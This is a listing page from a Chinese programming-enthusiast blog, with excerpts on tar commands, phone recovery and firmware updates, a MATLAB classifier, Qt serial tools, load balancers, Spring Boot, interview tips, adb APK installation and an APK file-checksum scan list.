<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19ad6f766d8a3ad7620bbccf4fafb95b/" rel="bookmark">
			压缩打包命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单个文件压缩打包 tar czvf my.tar file1
多个文件压缩打包 tar czvf my.tar file1 file2,...
单个目录压缩打包 tar czvf my.tar dir1
多个目录压缩打包 tar czvf my.tar dir1 dir2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68fb7ce64b1374d22a34a5ff47492521/" rel="bookmark">
			小米8开机android正在启动不了,小米无法开机解决办法【图文教程】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小米 智能手机的出现就改变了这个现状，人们可以花非常低的价格购买到性能非常强大的智能手机。因此使得小米智能手机一经推出市场就受到了非常多年轻人的喜欢。而人们在使用小米智能手机的时候会突然发生手机无法开机的情况，这个时候会大大的影响人们的正常使用。人们一般都会去修理店修理，其实有的时候一些小问题是可以自己解决的。那小编就给大家说一说小米智能手机无法开机的解决方法。
小米无法开机
首先在关机状态下按住“音量键上”和“电源键”开机，手机会启动至Recovery模式。在该模式下触摸屏暂时不能用，需要使用音量键上和下来移动选项，电源键来进行确认操作。
在打开的语言选择界面中，利用音量上下键选择“简体中文”，然后按一下电源键进行确认。
接着在打开的“主菜单”中选择“消除数据”，并按下“电源键”进行确定。
数据清除完成后，程序就会返回“主菜单”界面，然后利用音量上下选择“重启手机”，并按“电源键”确定。
接着在打开的“重启”界面中选择“重启进入系统一(最近)”，并按“电源键”，此时手机就会自动重启。
重启完成后，久违的小米手机桌面又出现啦。
小米刷机
无线下载完整包升级
1，在“系统更新”内点击菜单键，选择“下载最新完整包”。
2，在显示的新界面中点击“下载完整包”。
3，下载过程大约5分钟，下载过程在后台进行，不影响其他操做。
4，在新的对话界面中的点击“立即更新”。
5，在新的对话框中选择“开始升级”。
6，整个升级过程大约持续2分钟，完成后点击“重启系统”。
7，确认保存未保存的数据，点击“确定”。
8，大功告成，刷机成功，进入新系统。
刷入其他系统
1，在“系统更新”内点菜单键，点击“选择安装包”。
2，在文件浏览界面选择您所想刷入的ROM。
3，选择后会出现如下提示，点击“立即更新”。
4，在新的对话框中点击“开始升级”。
5，整个过程在后行，不影响您的其他工作。
6，升级过程完成后点击“重启进入新系统”
7，点击“确定”前请保存未完成的工作。
8，大功告成，成功进入新系统(以原生为例)。
现在社会上的每一个人都会拥有自己的智能手机，人们每天都会花大量的时间来进行网上购物以及交友等。而人们在购买智能手机的时候都会选择性价比高的，但是一直以来市场上的高性能智能手机品牌价格也是非常贵的，有非常多的年轻消费者是无法支付的起。而小米智能手机就是性价比非常高的。而小编给大家介绍的小米无法开机的解决方法，希望可以帮助到大家。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dee286f7b53ca2c8d2c254bd9b0df44/" rel="bookmark">
			多类线性分类器算法原理及代码实现 MATLAB
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多类线性分类器算法原理及代码实现 MATLAB 一、算法原理 下面举例说明为何蓝圈部分在case2中是确定的而在case1中不确定：
二、代码实现 1、HK函数 function [] = HK(w1_data,w2_data) %w1_data为第一类数据集 w2_data为第二类数据集 %此函数的作用为用HK算法对输入的数据集w1_data,w2_data做二分类，并画出分界面 lr=0.5 ;%学习率 MaxIter = ceil(20000/lr);%最大迭代次数 Eps = 1e-5; %精度 %% 增广化 w1_data=[w1_data';ones(1,size(w1_data,1))]'; w2_data=[w2_data';ones(1,size(w2_data,1))]'; Y=[w1_data;-w2_data];%待分类数据，w1在决策平面的正侧 [xmin,~]=min(Y,[],1); %求出横坐标最小值 [xmax,~]=max(Y,[],1); %求出横坐标最大值 b=rand(size(Y,1),1); Y_flag=(Y'*Y)\Y'; % Y_flag=pinv(Y); N=length(b); C=0;%迭代次数 while(C &lt; MaxIter) a=Y_flag*b; e=Y*a-b; zeronum = sum(e&lt;Eps &amp; e&gt;-Eps); nenum = sum(e&lt;0); if zeronum==N %all is 0 break; elseif nenum ==N break; end delta=lr*(e+abs(e)); b = b + delta; %更新b C=C+1; %迭代次数+1 end if C ==MaxIter if sum(e&gt;-Eps)==N % all is larger than or equal to 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dee286f7b53ca2c8d2c254bd9b0df44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d95c00ca374ab8828a5a33ad8b5e37bb/" rel="bookmark">
			QT从零开始作单片机上位机-串口调试助手&#43;波形显示-实现串口模块的配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
实现串口模块的配置（1）
一、先列举需要思考的问题：
二、所有的问题要由简单到复杂逐一解决
实现串口模块的配置（1） 完成了基本的界面设计后，我们就要着手实现功能。下来的几章我们看串口数据收发的功能怎么实现。
首先我需要阐明的是，由于做嵌入式开发，相信大部分人学习的是C语言，而QT用的是C++，那么用C语言的知识能否完成这个上位机的工作呢?我的回答是可以的。
逐步来分析整个实现过程：
一、先列举需要思考的问题： 怎么实现点击刷新按钮后，串口工具可以自动发现可用的COM口，并将com口显示在Combobox1?如何添加所有可用的波特率？同样给其他Combobox添加相关的值？如何在点击“打开”按钮后，串口 即可使用，同时所有Combobox置为不可用状态，按钮字体转变为“关闭”？如何在点击“清空接收区”按钮后，将接收区的数据清除？如何在点击“暂停接收区”按钮后，接收不再接收数据？如何实现自动清除功能？十六进制显示功能？如何实现十六进制发送功能？自动发送功能，发送可按照间隔时间发送？如何在点击“清空”按钮后，将Rx：Tx：的值显示为0？ 二、所有的问题要由简单到复杂逐一解决 1、先从Combobox入手，选中后双击，点击左下角“+”号，就可以直接在界面添加参数列表，所有Combobox操作方式一样。
2、处理简单的按钮问题：怎么实现点击“打开”按钮后变为“关闭”：
这里就要从代码入手，怎么办？通过网络大概可以了解到对按钮的动作要进行事件响应，QT通过“槽”机制实现，选中按钮，转到槽，在弹出的窗口中我们可以看到关于槽的函数：
可以推断按钮的点击可以是clicked();确定后看会是什么结果。
QT自动帮我们定义了一个函数： void MainWindow::on_pB_Open_clicked() { } 为了便于调用函数，我们对所有控件进行重命名，它跟生成的函数名是相关的。
至于MainWindow:: 部分显然是C++的语法，暂时不需要去理解，只知道人家就是这样用的，不乱该改就行。
那么on_pB_Open_clicked()这个函数的声明在哪里，搜一下，就知道：
class MainWindow : public QMainWindow { Q_OBJECT public: explicit MainWindow(QWidget *parent = 0); ~MainWindow(); private slots: void on_pB_Open_clicked(); } 整个结构还是C++的用法，那么可以推知:其他生成的函数也是在private slots:槽部分声明的。如果我们自定义一个槽函数也可以放到这里，知道这些足够。
我们的功能必然在这个函数体内来是实现，通过网络得知QT对空间的操作是通过ui变量来操作的，输入“ui-&gt;”QT编译器自动获取按钮的对象名称。下来的问题就是如何获取按钮的text属性“打开”，然后再改为“关闭”， ui-&gt;pB_Open-&gt;text()就可以。
if(ui-&gt;pB_Open-&gt;text()==tr("打开")) 这样就可以实现，
if(ui-&gt;pB_Open-&gt;text()==tr("打开")) { ui-&gt;pB_Open-&gt;setText(tr("关闭")); } else { ui-&gt;pB_Open-&gt;setText(tr("打开")); } 以上就是最简单的实现代码，可以运行看看效果。
Combobox的操作就是 …-&gt;setEnabled(false); …-&gt;setEnabled(true);
其他一些简单的槽函数都可以实现，比如清零、清空等操作。
3、串口调试工具要实现串口操作，就需要Qserialport 模块，这个直接可以通过网络知道。
如何在系统上获取可用串行端口的列表呢？
实现步骤：
1）打开.pro文件；添加一行：QT += serialport
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d95c00ca374ab8828a5a33ad8b5e37bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec4ab1aa4148ca0fe74299933d99b7b1/" rel="bookmark">
			lvs（四层和七层）、haproxy、nginx性能比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.lvs（四层和七层）七层各层简介：四层各层简介：OSI七层和TCP/IP四层的区别 2 LVS优缺点优点缺点 3 nginx优缺点优点缺点 4 haproxy特点HAPorxy缺点： 总结 1.lvs（四层和七层） 七层各层简介： 物理层（Physical Layer）：主要定义物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输,到达目的地后在转化为1、0，也就是我们常说的数模转换与模数转换），这一层的数据叫做比特，单位是bit比特。
数据链路层（Datalink Layer）：定义了如何让格式化数据以进行传输，以及如何让控制对物理介质的访问，这一层通常还提供错误检测和纠正，以确保数据的可靠传输。交换机(二层)、网桥设备在这一层。数据链路层协议的代表包括：PPP、STP、帧中继等。
网络层（Network Layer）：在位于不同地理位置的网络中的两个主机系统之间提供连接和路径选择，Internet的发展使得从世界各站点访问信息的用户数大大增加，而网络层正是管理这种连接的层。网络层负责在源机器和目标机器之间建立它们所使用的路由。路由器在该层。协议有：IP、ICMP（互联网控制报文协议）、ARP（地址转换协议）、RARP（反向地址转换协议）
传输层（Transport Layer）：O S I 模型中最重要的一层。定义了一些传输数据的协议和端口号（WWW端口80等），如：TCP（传输控制协议，传输效率低，可靠性强，用于传输可靠性要求高，数据量大的数据），UDP（用户数据报协议，与TCP特性恰恰相反，用于传输可靠性要求不高，数据量小的数据，如QQ聊天数据就是通过这种方式传输的）， 主要是将从下层接收的数据进行分段和传输，到达目的地址后再进行重组，常常把这一层数据叫做段。
传输协议同时进行流量控制或是基于接收方可接收数据的快慢程度规定适当的发送速率。除此之外，传输层按照网络能处理的最大尺寸将较长的数据包进行强制分割。例如，以太网无法接收大于1 5 0 0 字节的数据包。发送方节点的传输层将数据分割成较小的数据片，同时对每一数据片安排一序列号，以便数据到达接收方节点的传输层时，能以正确的顺序重组。该过程即被称为排序。
会话层（Session Layer）：负责在网络中的两节点之间建立、维持和终止通信。 会话层的功能包括：建立通信链接，保持会话过程通信链接的畅通，同步两个节点之间的对话，决定通信是否被中断以及通信中断时决定从何处重新发送。
通过传输层（端口号：传输端口与接收端口）建立数据传输的通路，主要在你的系统之间发起会话或者接受会话请求（设备之间需要互相认识可以是IP也可以是MAC或者是主机名）。
表示层（Presentation Layer）：应用程序和网络之间的翻译官，在表示层，数据将按照网络能理解的方案进行格式化；这种格式化也因所使用网络的类型不同而不同。 表示层管理数据的解密与加密，如系统口令的处理。可确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取。例如，PC程序与另一台计算机进行通信，其中一台计算机使用扩展二一十进制交换码（EBCDIC），而另一台则使用美国信息交换标准码（ASCII）来表示相同的字符。如有必要，表示层会通过使用一种通格式来实现多种数据格式之间的转换。
应用层（Application Layer）： 是最靠近用户的OSI层，这一层为用户的应用程序（例如电子邮件、文件传输和终端仿真）提供网络服务。
四层各层简介： TCP/IP是一组协议的代名词，它还包括许多协议，组成了TCP/IP协议簇。TCP/IP协议簇分为四层，IP位于协议簇的第二层(对应OSI的第三层)，TCP位于协议簇的第三层(对应OSI的第四层)。
TCP/IP通讯协议采用了4层的层级结构，每一层都呼叫它的下一层所提供的网络来完成自己的需求。这4层分别为：
应用层：应用程序间沟通的层，如简单电子邮件传输（SMTP）、文件传输协议（FTP）、网络远程访问协议（Telnet）等。
传输层：在此层中，它提供了节点间的数据传送服务，如传输控制协议（TCP）、用户数据报协议（UDP）等，TCP和UDP给数据包加入传输数据并把它传输到下一层中，这一层负责传送数据，并且确定数据已被送达并接收。
网络层：负责提供基本的数据封包传送功能，让每一块数据包都能够到达目的主机（但不检查是否被正确接收），如网际协议（IP）。
网络接口层：对实际的网络媒体的管理，定义如何使用实际网络（如Ethernet、Serial Line等）来传送数据。
OSI七层和TCP/IP四层的区别 OSI引入了服务、接口、协议、分层的概念，TCP/IP借鉴了OSI的这些概念建立TCP/IP模型。OSI先有模型，后有协议，先有标准，后进行实践；而TCP/IP则相反，先有协议和应用再提出了模型，且是参照的OSI模型。OSI是一种理论下的模型，而TCP/IP已被广泛使用，成为网络互联事实上的标准。 除了层的数量之外，开放式系统互联（OSI）模型与TCP/IP协议有什么区别？
开放式系统互联模型是一个参考标准，解释协议相互之间应该如何相互作用。TCP/IP协议是美国国防部发明的，是让互联网成为了目前这个样子的标准之一。开放式系统互联模型中没有清楚地描绘TCP/IP协议，但是在解释TCP/IP协议时很容易想到开放式系统互联模型。两者的主要区别如下：
TCP/IP协议中的应用层处理开放式系统互联模型中的第五层、第六层和第七层的功能。
TCP/IP协议中的传输层并不能总是保证在传输层可靠地传输数据包，而开放式系统互联模型可以做到。这是因为TCP/IP协议还提供一项名为UDP（用户数据报协议）的选择。UDP不能保证可靠的数据包传输。
有关问题
交换机工作在OSI的哪一层
二层交换机工作在OSI的第二层数据链路层，由于它们要对帧解码并使用帧信息将数据发送到正确的接收方，所以它们是工作在数据链路层的。
三层交换机是工作在OSI的网络层，因为三层交换机有路由功能。
路由器工作在OSI的哪一层
路由器工作在OSI七层模型的第3层，网络层。由于网络层处理，并智能指导数据传送，路由器连接网络各段，所以路由器属于网络层。在网络中，“路由”是基于编址方案、使用模式以及可达性来指引数据的发送。 网络层负责在源机器和目标机器之间建立它们所使用的路由。
PING命令使用OSI哪一层协议
ping命令使用的是ICMP协议，位于OSI七层网络模型中的第三层，网络层；
2 LVS优缺点 优点 抗负载能力强、是工作在网络4层之上仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的，对内存和cpu资源消耗比较低。配置性比较低，这是一个缺点也是一个优点，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率。工作稳定，因为其本身抗负载能力很强，自身有完整的双机热备方案，如LVS+Keepalived。无流量，LVS只分发请求，而流量并不从它本身出去，这点保证了均衡器IO的性能不会受到大流量的影响。应用范围比较广，因为LVS工作在4层，所以它几乎可以对所有应用做负载均衡，包括http、数据库、在线聊天室等等。 缺点 软件本身不支持正则表达式处理，不能做动静分离；而现在许多网站在这方面都有较强的需求，这个是Nginx/HAProxy+Keepalived的优势所在。如果是网站应用比较庞大的话，LVS/DR+Keepalived实施起来就比较复杂了，特别后面有 Windows Server的机器的话，如果实施及配置还有维护过程就比较复杂了，相对而言，Nginx/HAProxy+Keepalived就简单多了。 3 nginx优缺点 优点 工作在网络的7层之上，可以针对http应用做一些分流的策略，比如针对域名、目录结构，它的正则规则比HAProxy更为强大和灵活，这也是它目前广泛流行的主要原因之一，Nginx单凭这点可利用的场合就远多于LVS了。Nginx对网络稳定性的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势之一；相反LVS对网络稳定性依赖比较大。Nginx安装和配置比较简单，测试起来比较方便，它基本能把错误用日志打印出来。LVS的配置、测试就要花比较长的时间了，LVS对网络依赖比较大。可以承担高负载压力且稳定，在硬件不差的情况下一般能支撑几万次的并发量，负载度比LVS相对小些。Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url来检测。比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，Nginx会把上传切到另一台服务器重新处理，而LVS就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而不满。Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。LNMP也是近几年非常流行的web架构，在高流量的环境中稳定性也很好。Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，可以考虑用其作为反向代理加速器。Nginx可作为中层反向代理使用，这一层面Nginx基本上无对手，唯一可以对比Nginx的就只有 lighttpd了，不过 lighttpd目前还没有做到Nginx完全的功能，配置也不那么清晰易读，社区资料也远远没Nginx活跃。Nginx也可作为静态网页和图片服务器，这方面的性能也无对手。还有Nginx社区非常活跃，第三方模块也很多。 缺点 Nginx仅能支持http、https和Email协议，这样就在适用范围上面小些，这个是它的缺点。对后端服务器的健康检查，只支持通过端口来检测，不支持通过url来检测。不支持Session的直接保持，但能通过ip_hash来解决。LVS：使用Linux内核集群实现一个高性能、高可用的负载均衡服务器，它具有很好的可伸缩性（Scalability)、可靠性（Reliability)和可管理性（Manageability)。 4 haproxy 特点 HAProxy也是支持虚拟主机的，可以工作在4、7层(支持多网段)；HAProxy的优点能够补充Nginx的一些缺点，比如支持Session的保持，Cookie的引导；同时支持通过获取指定的url来检测后端服务器的状态。HAProxy跟LVS类似，本身就只是一款负载均衡软件；单纯从效率上来讲HAProxy会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的。HAProxy支持TCP协议的负载均衡转发，可以对MySQL读进行负载均衡，对后端的MySQL节点进行检测和负载均衡，大家可以用LVS+Keepalived对MySQL主从做负载均衡。HAProxy负载均衡策略非常多，HAProxy的负载均衡算法现在具体有如下8种：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec4ab1aa4148ca0fe74299933d99b7b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bff72d54eadfe1df3c4f18308c5aa993/" rel="bookmark">
			android10的coloros,OPPOReno10倍变焦版ColorOSV7刷机包（官方最新固件升级包安卓10ColorOS V7）...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OPPO Reno 10倍变焦版搭载高通骁龙855处理器，后置摄像头4800万像素+1300万像素+800万像素高清级像素，最新的系统版本已经更新，新增录屏内录功能，集成Android安全补丁，提升系统安全性，有需要的，可以进行下载了。
刷机前请提前备份您的个人资料，请将备份数据存储至电脑或其他设备，以防资料丢失!
版本介绍：
OPPO Reno 10倍变焦版 (PCCM00)安卓10 ColorOS V7
UI类型：Color OS
ROM大小：3200 M
Android系统版本：Android 10
更新日志：
安全
新增 集成Android 2020年6月安全补丁，提升系统安全性
相机
新增 视频光变功能，视频拍摄从超广角到广角再到长焦等不同焦段可轻松变换，给您带来全新拍摄体验。
系统
新增 无线打印， 无线连接打印机，便捷打印图片和PDF文件
优化 系统性能和稳定性，让您的手机运行更流畅、更稳定
优化 人脸识别，提升人脸识别的稳定性
游戏
新增 弹幕通知，游戏聊天两不误
工具
新增 便签待办功能，支持一键修改完成状态和设置时间提醒，高效管理待办事项
新增 便签加密文件夹功能，支持将便签中的私密信息存入加密文件夹内，不用担心私密信息外泄
新增 录音转文本，可将录音信息转为文本，并支持文本快捷导出
新增 日历/日程共享，可通过OPPO账号、微信小程序邀请好友加入，共享日历/日程动态
应用
新增 邮件APP，支持添加Exchange账号，方便管理多种邮箱
来源：xcl
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44cb4b2299b32874b1ccd0addaa12ed6/" rel="bookmark">
			springboot消息转换器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@Configuration public class WebConfigurer implements WebMvcConfigurer { /** * 定义JSON格式转换器 */ @Bean public MappingJackson2HttpMessageConverter jackson2HttpMessageConverter() { MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter(); ObjectMapper mapper = new ObjectMapper(); mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false); mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL); mapper.setDateFormat(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")); converter.setObjectMapper(mapper); // 将long类型的数据转为String类型 SimpleModule simpleModule = new SimpleModule(); simpleModule.addSerializer(Long.class, ToStringSerializer.instance); simpleModule.addSerializer(Long.TYPE, ToStringSerializer.instance); simpleModule.addSerializer(long.class, ToStringSerializer.instance); mapper.registerModule(simpleModule); return converter; } /** * 添加转换器 */ @Override public void configureMessageConverters(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters) { // 将我们定义的时间格式转换器添加到转换器列表中, // 这样jackson格式化时候但凡遇到Date类型就会转换成我们定义的格式 converters.add(jackson2HttpMessageConverter()); } } MappingJackson2HttpMessageConverter 处理请求类型为application/json类型数据。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc8320f691de45cc091293dcfe519a58/" rel="bookmark">
			职业规划（二）-- 怎么面试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 面试前准备2. 面试中3. 面试后 1. 面试前准备 面试前我们要做相关的准备，面试的职位不同，需要的准备也不相同。
因为本人是做 IT 的，从底层开发，项目工程落地，团队管理，ToB 项目的客户成功团队管理（除开发，测试等其他的工作，保证ToB 接入客户成功的团队），技术上，管理上，战略上都有涉及。
我只能以我目前当面试官的经历去讲解写以上的知识点。
技术上：
根据各个平台特性的一些需要了解的问题，这个在网上有很多，什么面试宝典啊，面试题等等，大家就直接刷题就好。算法上我涉及不多，我是做工程的，更多的工作内容是在于工程怎么落地，算法上可能就是一些数据结构上的知识，所以数据结构一定要了解，并且要有一些积累，这对我们以后的开发是有好处的。工作上的内容，一般我们招聘，都是要找在内容上是有合适的，那么在看简历的时候也会有知道面试者的项目内容，否则就没有办法面试了。所以工作上的内容和业绩一定要写清楚，一目了然，让面试官直接问你相关的工作细节就好。现在很多面试技术的，都只知道一些皮毛，或者工作中需要了解的，比如没有写过线程；进程不知道干什么的；任务队列都没有写过；数据结构都不知道
面试前要做好准备，一定要做好准备。 2. 面试中 本人仅面试过开发，售前，没有面试过其他的岗位，所以只能从这两个岗位上说，重要的一点，面试前一定要确定职位的职责到底在哪，先让面试官介绍下，如果不符合自己的预期，不要盲目的面试。
面试一定要提前准备，并且如果是网络测试，一定要提前测试自己的设备是否ok。如果有变动，一定要提前通知，现在虽然人不好招，但是对自己对他人都不负责任这也不好的。面试第一步，一般都是简介下自己。说明下，这一步一定不要长，也不要长篇大论，简短的介绍，给面试官在看看简历的时间。这个简短要有重点，比如你业绩比较好的项目，让面试官直接就感兴趣，这样可以节约时间，并且能对自己有利面试都会要问一些技术，问道自己会的技术，就直接回答好了；问道自己不会的，就直接回答不会。不要太浪费时间，要争取让面试官问一下你会的，他想了解，并且感兴趣的。项目经历，要说一些有业绩的，业绩是什么，一定要讲清楚；多讲出自己的看法，反省，总结；对自己未来的规划；一定要讲自己做了什么；说实话，可以夸大一点，但要自己圆上，不要夸大后，圆不回来就傻逼了。hr 面，就要自己把握了，不要说的太离谱，说对企业有利的，多顺着hr 说。如果频繁的跳槽，一定要说明理由，比如跟着领导跳的，公司有一些其他的事情啊等等，一定要说出，并且要对自己有利的说辞。性格方面要积极，并且要担责，并且要在项目中体现。至于hr 面中的一些问题，都可以上网上找到。面试过程中，一定要口齿清晰，思路简洁明了，尽可能的不要带有方言，沟通也是很重要一环。面试官也是为了工作，并且现在很多时候就要一天面试好几个人，你是在求职，面试官是在工作，所以你越详细，讲解的越好，面试官也轻松，越能问一些细节，大家一起协作，你的面试评价就越好。都说面试后可以找面试官问一些问题，提问不要太尖锐，随便问问就好，或者公司环境啊，福利啊，都可以。没有必要像网上那样的问一些话题什么的，当然有个准备也是有好处的。 3. 面试后 面试后，可以直接找 hr 或者猎头问下面试结果，不要不好意思。薪资看自己评估，一般上涨 20-30% 都可以的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2980c69b048da6cc96409cb94e6ea36d/" rel="bookmark">
			android shell 安装 apk,使用 adb shell 和 pm 安装 apk 包到安卓手机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 adb shell 和 pm 安装 apk 包到安卓手机
安装好 Android Studio 之后，adb 一般是在 /Users/exchen/Library/Android/sdk/platform-tools 目录
设置好环境变量或者切换到 adb 所在的目录，执行 adb devices 查看本机连接的设备，命令如下：
./adb devices
List of devices attached
0123456789ABCDEF device
emulator-5554 device
1
2
3
4
5
./adbdevices
Listofdevicesattached
0123456789ABCDEFdevice
emulator-5554device
可以看到上面的信息显示连接了两台设备，一个是真机，一个是模拟器，由于有两台设备执行操作时需要指定目标设备，比如安装 apk，命令如下：
./adb -s 0123456789ABCDEF install ~/Downloads/test.apk
Performing Push Install
adb: error: failed to copy '/Users/exchen/Downloads/test.apk' to '/data/local/tmp/test.apk': couldn't read from device
/Users/momo/Downloads/test.apk: 0 files pushed. 92.5 MB/s (131056 bytes in 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2980c69b048da6cc96409cb94e6ea36d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a65ba17f4a4c03e7d80ac13036b725f/" rel="bookmark">
			android&#43;apk&#43;不被杀毒软件,BuyNewCar_Android_duomeng.apk 0% Antivirus software(0/39) found malware! - VirSCA...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件列表
文件名
校验码
res/anim/latestoffer_round.xml
0xf5f00423
res/anim/progress.xml
0x9a5c6349
res/anim/progress_round.xml
0x57bae819
res/anim/push_up_in.xml
0x1e388206
res/anim/push_up_out.xml
0xb8bff983
res/anim/slide_in_from_bottom.xml
0x2aa4736f
res/anim/slide_in_from_top.xml
0x2cb16dfe
res/anim/slide_out_to_bottom.xml
0x343c2f52
res/anim/slide_out_to_top.xml
0xac87d604
res/anim/umeng_fb_slide_in_from_left.xml
0x970dfb8b
res/anim/umeng_fb_slide_in_from_right.xml
0xd29e9c99
res/anim/umeng_fb_slide_out_from_left.xml
0x807b5089
res/anim/umeng_fb_slide_out_from_right.xml
0x847927ad
res/drawable/actionbar_provider_background_selector.xml
0x69366c78
res/drawable/attr_bg_0.xml
0xcf3a62d9
res/drawable/attr_bg_1.xml
0xeea6408e
res/drawable/attr_textcolor.xml
0x9cec72cf
res/drawable/btn_arrow_gray_selector.xml
0x9d36fa1a
res/drawable/btn_arrow_noline_selector.xml
0x6c1f4847
res/drawable/btn_arrow_selector.xml
0x9857f216
res/drawable/btn_business_selector.xml
0x7def1fe0
res/drawable/btn_checkbox_selector.xml
0xc3617ed7
res/drawable/btn_pop_selector.xml
0x13b5a734
res/drawable/button_bg_logout_selector.xml
0xf6c41033
res/drawable/button_delete_bg_selector.xml
0x22b8fe25
res/drawable/calculator_radiobutton_selector.xml
0x6371e6ad
res/drawable/calculator_radiobutton_textcolor_selector.xml
0x31fde6ad
res/drawable/carbrand_item_bg.xml
0x4df318e0
res/drawable/carmodels_item_bg.xml
0xdf5aef3a
res/drawable/carparamsgridview_item_background_selector.xml
0xc7d66ce2
res/drawable/carparamsgridview_item_text_selector.xml
0x4944567c
res/drawable/carseries_item_bg.xml
0x488272e8
res/drawable/checkbox_selector.xml
0x9c576a61
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a65ba17f4a4c03e7d80ac13036b725f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7ba33233296781dffe68270b566864e/" rel="bookmark">
			flyme android 7 推送,魅族Flyme 7体验版推送更新：老旗舰也能升级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今日，魅族正式推送了Flyme 7体验版更新，版本号为Flyme 7.8.12.11 beta，这次的系统更新所涵盖的机型不仅包括今年的旗舰魅族16th和16th Plus，就连魅蓝Note 6和魅族Pro 7也可以尝尝鲜。
本次更新为魅族16th调整面部识别逻辑，支持暗光环境下进行解锁(16 th Plus后续支持)。
本次更新通过报名获得体验版推送，无需清除手机数据，可直接更新至体验版。从 Flyme 官网下载更新建议先备份好资料，选择清除数据更新。
报名方式：进入系统更新 App，将手机系统更新至最新稳定版后，点击“我要报名”即可。
本次更新支持机型如下：魅族16th
魅族16th Plus
魅族15 Plus
魅族15
魅族M15
魅族Pro 7 Plus
魅族Pro 7高配版
魅族Pro 7标配版
魅蓝Note 6
Flyme 7体验版12月11日更新内容大全：
魅族 16th、魅族 16th Plus
功能调整：
指纹、面部和安全移除密码输入错误后的锁定功能，支持多次输入密码和短时冻结，降低操作难度
16th调整面部识别逻辑，支持暗光环境下进行解锁(16 th Plus后续支持)
游戏模式游戏模式下支持锁定屏幕亮度功能，眼睛不受光线影响，游戏更稳定
